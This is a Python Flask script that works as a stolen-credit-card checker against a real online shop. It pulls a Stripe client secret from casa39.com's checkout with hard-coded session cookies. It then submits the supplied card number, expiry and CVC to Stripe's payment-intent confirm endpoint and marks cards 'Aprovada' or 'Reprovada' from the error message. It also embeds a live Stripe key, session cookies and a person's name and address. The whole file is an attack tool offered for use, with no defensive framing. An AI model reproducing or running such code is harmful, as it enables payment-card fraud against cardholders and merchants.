import requests
import json
from flask import Flask, request
app = Flask(__name__)

	
	

	
def pegar_custom():
    
    
    params = {
    'form_key': '28RIi5jFCldaC5ps',
    '_': '1695378235756',
}
    cookies = {
    '_ga': 'GA1.2.265376287.1695377957',
    '_gid': 'GA1.2.1984105251.1695377957',
    'form_key': '28RIi5jFCldaC5ps',
    'mage-cache-storage': '{}',
    'mage-cache-storage-section-invalidation': '{}',
    'mage-messages': '',
    'recently_viewed_product': '{}',
    'recently_viewed_product_previous': '{}',
    'recently_compared_product': '{}',
    'recently_compared_product_previous': '{}',
    'product_data_storage': '{}',
    'cookieconsent_status': 'dismiss',
    'twk_idm_key': 'fBAnbx-2dQ0cca5WkohVE',
    'amzn-checkout-session': '{}',
    'tabCounter': '3',
    'mt_eop__648af13d92bf7d1019e0af47c8e71074': 'true',
    'amzn-checkout-session-config': '{}',
    'language': 'it_IT',
    'ledgerCurrency': 'EUR',
    'apay-session-set': '18cGSMPJBFuPU%2BPbgjXj1KnSCyQNtPLNSnbLwvMxQVp%2BLCxVPquxb5Fj%2BhhR5vw%3D',
    'persistent_shopping_cart': '1VMY2VvbIK9dAgKaL1vUdwr6Z43SsYgk3EdVkIqb4IMBQpWAkK',
    'form_key': '28RIi5jFCldaC5ps',
    'mage-cache-sessid': 'true',
    'PHPSESSID': 'd2e94969191e98eb1bc3972063975e7a',
    'twk_uuid_62b325b5b0d10b6f3e78c801': '%7B%22uuid%22%3A%221.1hH7LypGKLpZVF8EEyiZLgE0FCNhRCFnpaniecmxbAx8g8OP3MjXkoX2HGXu8F4csUoBeEIosg5AhHRPvZYngpgu7pLYhFwzMP2M9RyS13I8TOzwzS9%22%2C%22version%22%3A3%2C%22domain%22%3A%22casa39.com%22%2C%22ts%22%3A1695378239526%7D',
    '__stripe_mid': '96460e02-1abe-41c9-b616-c6ef3054b72f8025c1',
    '__stripe_sid': 'eaed12c9-5cb1-4ab1-8155-667e3c1539529927b9',
    'private_content_version': '329a31a2a5051603d698b6276c97322d',
    'X-Magento-Vary': '00077511e45004e3e3295f0d0f754c41612c847c',
    'section_data_ids': '{%22quotecart%22:1695378192%2C%22cart%22:1695378241%2C%22directory-data%22:1695378192%2C%22wp_ga4%22:1695378292%2C%22messages%22:1695378295}',
    'TawkConnectionTime': '1695378314734',
    }
    headers = {
    'Host': 'www.casa39.com',
  
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
   
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'referer': 'https://www.casa39.com/checkout/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_ga=GA1.2.265376287.1695377957; _gid=GA1.2.1984105251.1695377957; form_key=28RIi5jFCldaC5ps; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; cookieconsent_status=dismiss; twk_idm_key=fBAnbx-2dQ0cca5WkohVE; amzn-checkout-session={}; tabCounter=3; mt_eop__648af13d92bf7d1019e0af47c8e71074=true; amzn-checkout-session-config={}; language=it_IT; ledgerCurrency=EUR; apay-session-set=18cGSMPJBFuPU%2BPbgjXj1KnSCyQNtPLNSnbLwvMxQVp%2BLCxVPquxb5Fj%2BhhR5vw%3D; persistent_shopping_cart=1VMY2VvbIK9dAgKaL1vUdwr6Z43SsYgk3EdVkIqb4IMBQpWAkK; form_key=28RIi5jFCldaC5ps; mage-cache-sessid=true; PHPSESSID=d2e94969191e98eb1bc3972063975e7a; twk_uuid_62b325b5b0d10b6f3e78c801=%7B%22uuid%22%3A%221.1hH7LypGKLpZVF8EEyiZLgE0FCNhRCFnpaniecmxbAx8g8OP3MjXkoX2HGXu8F4csUoBeEIosg5AhHRPvZYngpgu7pLYhFwzMP2M9RyS13I8TOzwzS9%22%2C%22version%22%3A3%2C%22domain%22%3A%22casa39.com%22%2C%22ts%22%3A1695378239526%7D; __stripe_mid=96460e02-1abe-41c9-b616-c6ef3054b72f8025c1; __stripe_sid=eaed12c9-5cb1-4ab1-8155-667e3c1539529927b9; private_content_version=329a31a2a5051603d698b6276c97322d; X-Magento-Vary=00077511e45004e3e3295f0d0f754c41612c847c; section_data_ids={%22quotecart%22:1695378192%2C%22cart%22:1695378241%2C%22directory-data%22:1695378192%2C%22wp_ga4%22:1695378292%2C%22messages%22:1695378295}; TawkConnectionTime=1695378314734',
}

    
    response = requests.get(
    'https://www.casa39.com/amstripe/checkout_paymentintents/data',
    params=params,
    cookies=cookies,
    headers=headers,)
    print(response.text)

    
    return json.loads(response.text)







def pegar_cod(cc, mon, year, cvc, key):
    cc = int(cc)
    mon = int(mon)
    year = int(year)
    cvc = int(cvc)
    headers = {
    'Host': 'api.stripe.com',
    # 'content-length': '715',

    'accept': 'application/json',
    'content-type': 'application/x-www-form-urlencoded',
 
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
   
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',}
    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=Ionildo+Pereira+paiva&payment_method_data[billing_details][address][line1]=8534+East+Bridgeton+Street+Pasadena%2C+TX+77502&payment_method_data[billing_details][address][city]=Texas&payment_method_data[billing_details][address][postal_code]=77502&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][state]=&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mon}&payment_method_data[card][exp_year]={year}&payment_method_data[guid]=4d088ca4-2730-4cab-a7a9-e3f89c8a0a15794108&payment_method_data[muid]=96460e02-1abe-41c9-b616-c6ef3054b72f8025c1&payment_method_data[sid]=eaed12c9-5cb1-4ab1-8155-667e3c1539529927b9&payment_method_data[payment_user_agent]=stripe.js%2Fbc142a0e10%3B+stripe-js-v3%2Fbc142a0e10%3B+card-element&payment_method_data[time_on_page]=66661&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_nDoeYaO9OuJlwghFXPLdgSwy00VyBxMtws&client_secret={key}'
    url = key.split("_")
    url = url[0] + "_" + url[1]
    print(url)
    response = requests.post(
   f'https://api.stripe.com/v1/payment_intents/{url}/confirm',
    headers=headers,
    data=data,)
    return json.loads(response.text)














#
	
	

@app.route('/')
def incrementer():
    lista = request.args.get("lista").replace(":", "|").replace("/,", "|").split("|")
    if len(lista) < 4 or len(lista) > 4:
    	return "Formato invalido"
    cc = lista[0]
    mon = lista[1]
    year = lista[2]
    year = year.replace("20", "")
    cvc = lista[3]
 
    
    try:

    	custom = pegar_custom()
    	key = custom["clientSecret"]
    	cod = pegar_cod(cc, mon, year, cvc, key)
    	print(cod)
    	msg = cod["error"]["message"]
    	print(msg)
    	retorna = ""
    	if msg == "Your card has insufficient funds.":
    		retorna = f"<b>#Aprovada -> <span class='text-success'> {lista} | </span> Retorno: <span class='text-primary'>『 {msg} 』✅</span> => <span class='text-warning'>@perryzin</span><br></b>"
    	elif msg == "Your card's security code is incorrect.":
    		retorna = f"<b>#Aprovada -> <span class='text-success'> {lista} | </span> Retorno: <span class='text-primary'>『 {msg} 』✅</span> => <span class='text-warning'>@perryzin</span><br></b>"
    	else:
    		retorna = f"#Reprovada -> {lista} Retorno: <span class='text-primary'>『 {msg} 』❌</span> => <span class='text-warning'>@perryzin</span><br>";
    except Exception as error:
    	print(error)
    	msg = "Cartão invalido"
    	retorna = f"#Reprovada -> {lista} Retorno: <span class='text-primary'>『 {msg} 』❌</span> => <span class='text-warning'>@perryzin</span><br>"
    return retorna 


app.run()





